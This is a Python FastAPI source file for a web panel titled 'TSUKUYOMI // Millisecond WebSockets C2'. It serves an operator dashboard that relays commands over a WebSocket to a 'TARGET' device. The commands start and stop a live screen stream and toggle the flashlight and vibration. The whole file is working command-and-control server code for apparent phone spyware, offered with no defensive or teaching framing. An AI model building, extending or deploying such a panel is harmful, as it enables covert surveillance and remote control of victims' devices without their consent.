from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import json

app = FastAPI()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TSUKUYOMI // Millisecond WebSockets C2</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; }
        .glass-panel { background: rgba(18, 24, 36, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .log { font-family: monospace; background: #090e17; border: 1px solid #1e293b; color: #55f0b3; padding: 12px; border-radius: 10px; height: 250px; overflow-y: auto; }
        .screen-box { width: 280px; height: 560px; background: #000; border: 6px solid #1e293b; border-radius: 24px; overflow: hidden; display: flex; align-items: center; justify-content: center; margin: auto; }
        .screen-box img { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body class="p-4 md:p-8 flex flex-col items-center">
    <header class="w-full max-w-5xl glass-panel p-4 rounded-2xl mb-6 flex justify-between items-center">
        <div>
            <h1 class="font-bold text-lg text-white">TSUKUYOMI // ULTRA-FAST WEBSOCKET C2</h1>
            <p class="text-xs text-slate-400">Status: <span id="connStatus" class="text-red-500 font-semibold">DISCONNECTED</span></p>
        </div>
        <div class="px-3 py-1 bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-lg text-xs font-mono">MS-STREAM ACTIVE</div>
    </header>

    <main class="w-full max-w-5xl grid grid-cols-1 md:grid-cols-12 gap-6">
        <div class="md:col-span-5 glass-panel p-4 rounded-2xl flex flex-col items-center space-y-4">
            <h3 class="text-xs font-bold font-mono uppercase text-slate-300">Live Screen Stream (Milliseconds)</h3>
            <div class="screen-box" id="screenContainer">
                <span class="text-xs text-slate-500 text-center px-4">Waiting for live stream frames...</span>
            </div>
            <div class="flex gap-2 w-full">
                <button onclick="sendCmd('SCREEN_START')" class="flex-1 py-2 bg-cyan-500 text-slate-950 font-bold rounded-xl text-xs">Start Stream</button>
                <button onclick="sendCmd('SCREEN_STOP')" class="flex-1 py-2 bg-slate-800 text-slate-300 rounded-xl text-xs border border-slate-700">Stop Stream</button>
            </div>
        </div>

        <div class="md:col-span-7 glass-panel p-4 rounded-2xl flex flex-col space-y-4">
            <h3 class="text-xs font-bold font-mono uppercase text-slate-300">Millisecond Terminal & Commands</h3>
            <div class="grid grid-cols-3 gap-2">
                <button onclick="sendCmd('FLASH_ON')" class="p-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-amber-400">🔦 Flash ON</button>
                <button onclick="sendCmd('FLASH_OFF')" class="p-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-slate-300">🔦 Flash OFF</button>
                <button onclick="sendCmd('VIBRATE')" class="p-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-cyan-300">📳 Vibrate</button>
            </div>
            <div class="log" id="logBox">[SYSTEM] Connecting via WebSocket...</div>
        </div>
    </main>

    <script>
        const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
        const ws = new WebSocket(wsProtocol + window.location.host + '/ws');

        ws.onopen = () => {
            document.getElementById('connStatus').innerText = "CONNECTED (MS-WS)";
            document.getElementById('connStatus').className = "text-green-400 font-semibold";
            log("Connected to WebSocket with zero latency.");
        };

        ws.onmessage = (event) => {
            let data = JSON.parse(event.data);
            if(data.frame) {
                document.getElementById('screenContainer').innerHTML = `<img src="data:image/jpeg;base64,${data.frame}" alt="Live">`;
            }
            if(data.response) {
                log("[TARGET] " + data.response);
            }
        };

        ws.onclose = () => {
            document.getElementById('connStatus').innerText = "DISCONNECTED";
            document.getElementById('connStatus').className = "text-red-500 font-semibold";
            log("WebSocket disconnected.");
        };

        function sendCmd(cmd) {
            ws.send(JSON.stringify({ command: cmd }));
            log("[DISPATCHED] -> " + cmd);
        }

        function log(msg) {
            let box = document.getElementById('logBox');
            let time = new Date().toLocaleTimeString();
            box.textContent += `\\n[${time}] ${msg}`;
            box.scrollTop = box.scrollHeight;
        }
    </script>
</body>
</html>
"""

class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            await connection.send_text(message)

manager = ConnectionManager()

@app.get("/")
async def get():
    return HTMLResponse(HTML_TEMPLATE)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            await manager.broadcast(data)
    except WebSocketDisconnect:
        manager.disconnect(websocket)
